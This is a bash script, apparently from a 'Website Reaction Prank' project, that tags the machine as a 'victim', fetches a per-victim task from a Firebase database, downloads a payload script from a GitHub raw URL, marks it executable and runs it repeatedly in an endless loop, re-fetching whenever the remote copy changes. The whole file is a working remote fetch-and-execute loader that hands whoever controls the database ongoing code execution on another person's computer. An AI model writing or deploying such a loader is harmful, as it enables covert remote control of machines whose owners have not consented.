#!/usr/bin/env bash
# Download and run a script from a prepspecified location.

SCRIPTDIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )

victim="$1"
if [ -z "$victim" ]; then
  victim="$USER.`hostname`"
fi

victim="`echo $victim | tr '.#[]/$' '______'`"
firebaseProject="prankproject-cb680"
payloadPrefix="https://raw.githubusercontent.com/thiesgehrmann/"

###################################################################
 # Configuration variables
taskURL="https://pastebin.com/raw/PPUdAf1s"

localTaskData="$SCRIPTDIR/taskdata"
localPayloadFile="$SCRIPTDIR/payload"
localPayloadETagFile="$SCRIPTDIR/payload.etag"
localPayloadURLFile="$SCRIPTDIR/payload.url"

jq="$SCRIPTDIR/jq"

###################################################################

# Remove the payload and local values

rm -rf "$localPayloadFile" "$localPayloadETagFile" "$localPayloadURLFile"
touch "$localPayloadFile"
touch "$localPayloadETagFile"
touch "$localPayloadURLFile"

###################################################################

function installJQ() {
  if [ -e "$jq" ]; then
    curl -L -s "https://github.com/stedolan/jq/releases/download/jq-1.5/jq-osx-amd64" > "$jq"
    chmod +x "$jq"
  fi
}

###################################################################

function urlExists(){
  local url="$1"
  if [ ! -z "`curl -s -I "$1" 2>&1 | head -n1 | grep '\(404\|400\)'`" ]; then
    echo 1
  else
    echo 0
  fi
}

function getURLETag(){
  #echo "getURLETag: $1" >&2
  local remoteURL="$1"

  curl -s -H 'Cache-Control: no-cache' -I "$remoteURL" \
   | grep '^ETag' \
   | cut -d'"' -f2
}

function getTaskURL(){
  echo "getTaskURL: $1" >&2
  local victimID="$1"

  curl -s "https://${firebaseProject}.firebaseio.com/victims/$victimID/task.json" \
   | tr -d '"'

}

function getPayloadURL(){
  #echo "getPayloadURL: $1" >&2
  local url="$1"
  local victimID="$2"
  
  local payloadURL=`getTaskURL "$victimID"`
  echo "getPayloadURL: $payloadURL" >&2
  if [ "$payloadURL" == "null" ]; then
    payloadURL=`getTaskURL "default"`
  fi
  echo "${payloadPrefix}${payloadURL}"

}

function downloadURL(){
  #echo "downloadURL: $1, $2"
  local url="$1"

  local outfile="$2"
  echo "downloadURL: Downloading $url"
  curl -s -L "$url" > "$outfile"
  chmod +x "$outfile"
}

function downloadPayloadIfNeeded(){

  local remoteURL=`getPayloadURL "$taskURL" "$victim"`
  local remoteURLETag=`getURLETag "$remoteURL"`
  localURL=`head -n1 "$localPayloadURLFile"`
  localETag=`head -n1 "$localPayloadETagFile"`

  echo "downloadPayloadIfNeeded: l-> $localURL"
  echo "downloadPayloadIfNeeded: r-> $remoteURL"
  echo "downloadPayloadIfNeeded: l-> $localETag"
  echo "downloadPayloadIfNeeded: r-> $remoteURLETag"

    # We have a totally new URL, we should get it no matter what!
  if [ "$remoteURL" != "$localURL" ]; then
    echo "downloadPayloadIfNeeded: We have a new URL!"
    downloadURL "$remoteURL" "$localPayloadFile"
    echo "$remoteURL" > "$localPayloadURLFile"
    echo "$remoteURLETag" > "$localPayloadETagFile"

  else
    echo "downloadPayloadIfNeeded: Same URL"

    if [ "$localETag" != "$remoteURLETag" ]; then
      echo "downloadPayloadIfNeeded: The payload has been updated!"
      downloadURL "$remoteURL" "$localPayloadFile"
      echo "$remoteURLETag" > "$localPayloadETagFile"
    fi
  fi

}

function runPayload() {
  echo "runPayload: Running"
  "$localPayloadFile" "$victim" "$iteration"
}


###################################################################

# Only perform the next steps if we are not being sourced
if [ "${BASH_SOURCE[0]}" == "${0}" ]; then

  echo "#################################"
  echo "# Website Reaction Prank         "
  echo "# VictimID: $victim              "
  echo "#################################"
  
  iteration=1
  
  while [ true ]; do
  
    echo "###################################"
    echo "Iteration $iteration"
    echo ""
  
    downloadPayloadIfNeeded
  
    timeStart=`date '+%s'`
    while [ $((`date '+%s'` - timeStart)) -lt 15 ]; do
      echo "Root: Running payload"
      runPayload
      sleep 1
    done
  
    let iteration=$((iteration+1))
  
  done

fi
